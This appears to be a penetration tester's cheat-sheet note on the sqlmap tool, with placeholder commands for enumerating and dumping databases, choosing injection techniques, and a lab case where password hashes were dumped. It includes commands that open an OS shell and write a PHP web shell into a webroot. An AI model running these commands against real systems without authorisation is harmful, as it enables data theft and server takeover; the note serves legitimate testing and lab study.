
# SQLmap

Automated SQL injection detection and exploitation tool. Handles detection, database enumeration, data extraction, and in some cases OS-level access.

> [!warning] Noise
> SQLmap generates significant traffic and is easily detected. On real engagements confirm injection manually first, then use sqlmap only when authorised. Always use `--batch` to avoid interactive prompts halting a long run.

> [!tip] Session Cookies
> Authenticated endpoints require a valid session cookie (`--cookie`). Cookies expire  -  if you get 401s mid-run, grab a fresh cookie and restart.

---

## Basic Usage

```bash
# Detect injection and list databases
sqlmap -u '<URL>' --dbs --batch

# Authenticated endpoint  -  pass session cookie
sqlmap -u '<URL>' --cookie="SESSIONNAME=<value>" --dbs --batch
```

---

## Enumeration Workflow

```bash
# 1. List all databases
sqlmap -u '<URL>' --cookie="<COOKIE>" --dbs --batch

# 2. List tables in a database
sqlmap -u '<URL>' --cookie="<COOKIE>" -D <database> --tables --batch

# 3. Dump specific columns from a table
sqlmap -u '<URL>' --cookie="<COOKIE>" -D <database> -T <table> -C <col1>,<col2> --dump --batch

# 4. Dump entire table
sqlmap -u '<URL>' --cookie="<COOKIE>" -D <database> -T <table> --dump --batch
```

---

## Flags

| Flag | Description |
|------|-------------|
| `-u '<URL>'` | Target URL |
| `--cookie="<value>"` | Session cookie for authenticated endpoints |
| `--dbs` | Enumerate databases |
| `--tables` | Enumerate tables |
| `--dump` | Dump table data |
| `-D <db>` | Target specific database |
| `-T <table>` | Target specific table |
| `-C <col1>,<col2>` | Target specific columns |
| `--batch` | Non-interactive  -  use defaults for all prompts |
| `--threads=<n>` | Parallel threads (default: 1, max: 10) |
| `--hex` | Encode retrieved data as hex  -  helps with binary/special chars |
| `--level=<1-5>` | Depth of tests (default: 1) |
| `--risk=<1-3>` | Risk of tests  -  higher risks data modification (default: 1) |
| `--os-shell` | Attempt interactive OS shell via file write |
| `--technique=<T>` | Limit to specific technique (B=Boolean, T=Time, E=Error, U=Union) |

---

## Injection Techniques

| Code | Technique | Notes |
|------|-----------|-------|
| `B` | Boolean-based blind | Infers data from true/false responses |
| `T` | Time-based blind | Infers data from response delay (e.g. `SLEEP()`) |
| `E` | Error-based | Extracts data from database error messages |
| `U` | UNION-based | Appends extra SELECT  -  fast but requires visible output |
| `S` | Stacked queries | Executes multiple statements  -  allows writes |
| `Q` | Inline queries | Nested subquery injection |

---

## Common Scenarios

```bash
# Time-based blind  -  slow, specify technique to avoid wasting time on others
sqlmap -u '<URL>' --cookie="<COOKIE>" --technique=T --dbs --batch

# Speed up with threads and hex encoding
sqlmap -u '<URL>' --cookie="<COOKIE>" -D <db> -T <table> --dump --batch --threads=10 --hex

# POST request injection
sqlmap -u '<URL>' --data="param1=val1&param2=val2" --dbs --batch

# Injection in a specific parameter
sqlmap -u '<URL>?id=1&name=test' -p id --dbs --batch
```

---

## OS Access (Requires FILE Privilege)

```bash
# Attempt interactive OS shell (requires MySQL FILE privilege + writable webroot)
sqlmap -u '<URL>' --cookie="<COOKIE>" --os-shell

# Write a file via SQL
sqlmap -u '<URL>' --cookie="<COOKIE>" --file-write=shell.php --file-dest=/var/www/html/shell.php
```

> These require the database user to have FILE privilege. Often blocked on hardened systems. See [[CCTV]] for a case where this failed  -  `--os-shell` was restricted to `/var/lib/mysql-files/`.

---

## Seen In

| Box | Injection Type | Notes |
|-----|---------------|-------|
| [[CCTV]] | Time-based blind (`tid` parameter) | ZoneMinder CVE  -  dumped bcrypt hashes from Users table |
